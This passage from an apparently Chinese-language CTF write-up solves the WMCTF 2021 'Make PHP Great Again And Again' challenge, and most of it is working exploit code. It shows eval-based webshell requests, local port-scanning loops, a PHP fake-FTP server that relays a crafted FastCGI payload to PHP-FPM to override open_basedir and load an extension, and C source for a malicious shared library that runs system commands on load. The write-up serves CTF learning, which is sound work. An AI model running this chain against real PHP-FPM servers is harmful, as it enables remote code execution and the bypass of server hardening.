&lt;li>用file_put_contents(&amp;rsquo;/tmp/wuhu.so&amp;rsquo;,$_POST[&amp;lsquo;data&amp;rsquo;])的形式将.so传入&lt;/li>
&lt;li>如果顺利的话open_basedir解开限制，.so被包含，就可以成功执行.so中的代码做到rce了&lt;/li>
&lt;/ul>
&lt;p>这里的完美栗子当然是赵总的三句话（指路赵总博客-&amp;gt;&lt;a href="https://www.zhaoj.in/read-6951.html">WMCTF2021-Web-Make PHP Great Again And Again WriteUp&lt;/a>&lt;/p>
&lt;h4 id="wmctf-2021make-php-great-again-and-again">[WMCTF 2021]Make PHP Great Again And Again&lt;/h4>
&lt;p>思路先放在前面：找到fpm端口-&amp;gt;搭建恶意ftp_server 将.so文件转发至fpm端口-&amp;gt;利用.so文件执行命令-&amp;gt;拿flag&lt;/p>
&lt;p>题目代码只有三句话&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;glzjin&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接看phpinfo();会500，用&lt;code>get_cfg_var&lt;/code>获取配置项&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27disable_functions%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(657) &amp;#34;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive&amp;#34;
&lt;/code>&lt;/pre>&lt;p>只能说该禁的都禁了；再康康allow_url_fopen和include&lt;/p>
&lt;pre tabindex="0">&lt;code>string(1) &amp;#34;1&amp;#34;
string(0) &amp;#34;&amp;#34;
&lt;/code>&lt;/pre>&lt;p>再康康open_basedir&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27open_basedir%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(14) &amp;#34;/var/www/html/&amp;#34;
&lt;/code>&lt;/pre>&lt;p>emmmmmmmmm 这个之后也需要绕过&lt;/p>
&lt;p>用tcp://伪协议扫一下本机开放的端口&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ee2&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;Address already in use&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者&lt;code>file_get_contents&lt;/code>和&lt;code>error_get_last&lt;/code>获取到请求中发出的错误进行循环判断也可以进行端口扫描&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error_get_last&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#d88200">&amp;#39;message&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection refused&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>int(11451) int(37114) int(48748)
&lt;/code>&lt;/pre>&lt;p>找到了fpm端口11451&lt;/p>
&lt;p>之后就续上了我们前面的思路，先在本地（也就是靶机的本地）起一个恶意的ftp_server服务用来转发FTP-DATA（即.so文件）至fpm端口（11451）；这里的exp是php版的，原理跟上面的py版是一样的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$socket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:46819&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errno&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$errstr&lt;/span>&lt;span style="color:#d88200"> (&lt;/span>&lt;span style="color:#d88200">$errno&lt;/span>&lt;span style="color:#d88200">)&amp;lt;br /&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_accept&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;210 Fake FTP&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// USER
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;230 Login successful&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// TYPE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;200 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// SIZE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;550 xx&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// EPSV
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;500 wtf&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// PASV
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// $ip = &amp;#39;192.168.1.4&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11451&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$porth&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">floor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$portl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$port&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;227 Entering Passive Mode. &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ip&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;,&lt;/span>&lt;span style="color:#d88200">$porth&lt;/span>&lt;span style="color:#d88200">,&lt;/span>&lt;span style="color:#d88200">$portl\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// STOR
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;125 GOGOGO!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;226 Thanks!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$conn&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$socket&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>urlencode之后传入，再扫一下端口可以看到46819开放，说明服务正常；还是用之前p牛的脚本构造，这里我们要修改的配置项是这些&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;#39;PHP_ADMIN_VALUE&amp;#39;: &amp;#39;allow_url_include = On\nopen_basedir = /\nextension = /tmp/wuhu.so&amp;#39;,
&lt;/code>&lt;/pre>&lt;p>覆盖掉open_basedir的原有设置，再加上.so文件（稍后上传）；具体的payload也可以用p牛的脚本魔改一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211113011624783.png" alt="image-20211113011624783">&lt;/p>
&lt;p>注释掉157-159对连接状态的判断，在191创建连接前将request部分直接输出urlencode的版本然后exit(0)一波退出&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST: a=$payload=urldecode(&amp;#39;%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00&amp;#39;);var_dump(file_put_contents(&amp;#39;ftp://127.0.0.1:46819/wuhu&amp;#39;,$payload));
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114223615660.png" alt="image-20211114223615660">&lt;/p>
&lt;p>写恶意.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ls / -al &amp;gt; /tmp/p1.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;find / -perm -4000 2&amp;gt;/tmp/p2.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat /flag &amp;gt; /tmp/p3.txt&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>传.so&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=eval($_POST[%27a%27]);
POST:
a=var_dump(file_put_contents(&amp;#39;/tmp/wuhu.so&amp;#39;,$_POST[&amp;#39;data&amp;#39;]));&amp;amp;data=xxxxxxxxxxxxxxxxxxx
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114224351897.png" alt="image-20211114224351897">&lt;/p>
&lt;p>试着执行一下命令，成功解除open_basedir的限制&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114231135348.png" alt="image-20211114231135348">&lt;/p>
&lt;p>但是一样的操作之后就执行不了了……就上面这个页面，就正常出来了第一次，然后就不行了，非常的离谱啊啊啊啊啊&lt;/p>
